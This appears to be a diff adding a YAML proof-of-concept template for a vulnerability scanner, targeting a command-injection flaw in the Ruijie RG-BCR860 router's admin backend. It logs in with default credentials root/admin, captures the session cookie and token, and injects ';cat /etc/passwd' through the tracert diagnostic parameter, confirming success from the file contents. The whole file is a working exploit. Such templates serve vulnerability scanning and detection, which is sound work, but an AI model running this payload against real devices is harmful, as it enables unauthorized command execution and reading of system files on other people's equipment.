@@ -1,0 +1,30 @@
+id: poc-yaml-rujie-RG-BCR860-Backend-Command-Injection
+info:
+  name: 锐捷 RG-BCR860 后台命令注入
+  severity: high
+  tags:
+  - rce
+  finger: Nginx
+requests:
+- method: POST
+  path: /cgi-bin/luci/admin
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: luci_username=root&luci_password=admin
+  expression: status_code == 302 && contains(body,"")
+  output:
+  - regex_match(headers, "sysauth=(?P<cookie>[a-zA-Z0-9]+);")
+  - regex_match(headers, ";stok=(?P<stok>[a-zA-Z0-9]+)/admin")
+- method: GET
+  path: /cgi-bin/luci/;stok={{.stok}}/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=0
+  headers:
+    Cookie: sysauth={{.cookie}}
+  expression: status_code == 200
+- method: GET
+  path: /cgi-bin/luci/;stok={{.stok}}/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=0
+  headers:
+    Cookie: sysauth={{.cookie}}
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+variables: {}
+transport: http
